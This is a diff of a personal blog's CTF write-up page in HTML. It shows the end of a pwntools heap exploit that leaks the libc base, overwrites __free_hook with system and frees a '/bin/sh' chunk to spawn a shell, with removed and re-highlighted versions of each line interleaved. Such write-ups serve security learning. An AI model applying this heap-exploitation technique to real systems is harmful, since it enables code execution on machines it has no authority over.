+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index: &#34;</span>, <span style=color:#007020>str</span>(<span style=color:#40a070>8</span>))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Offset 1 : &#34;</span>)
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__malloc_hook&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x70</span>
+</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> hex(libc_base))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;offset: &#34;</span>, <span style=color:#007020>str</span>(<span style=color:#40a070>1</span>))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;(y/n)? &#34;</span>, <span style=color:#4070a0>&#39;y&#39;</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>system = libc_base + libc.sym[&#34;system&#34;]
-</span></span><span style=display:flex><span>__free_hook = libc_base + libc.sym[&#34;__free_hook&#34;]
+</span></span><span style=display:flex><span>system <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;system&#34;</span>]
+</span></span><span style=display:flex><span>__free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>add(0x60, p64(0) * 7 + p64(0x41) + p64(__free_hook))
-</span></span><span style=display:flex><span>Remove(0, 1)
-</span></span><span style=display:flex><span>Remove(3, 1)
-</span></span><span style=display:flex><span>Remove(6, 1)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x60</span>, p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>7</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0x41</span>) <span style=color:#666>+</span> p64(__free_hook))
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>3</span>, <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>6</span>, <span style=color:#40a070>1</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>add(0x38, &#39;/bin/sh\x00&#39;) # 0
-</span></span><span style=display:flex><span>add(0x38, p64(system))
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 0</span>
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x38</span>, p64(system))
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Remove(0, 1)
+</span></span><span style=display:flex><span>Remove(<span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>)
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>#gdb.attach(proc.pidof(sh)[0])
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sh.interactive()
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
 </span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
 <a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
 <a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
 <a class=border></a><a class=soc href=https://www.cjovi.icu/index.xml rel=me title=Rss><i data-feather=rss></i></a>
-<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2023  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>
+<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2024  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>
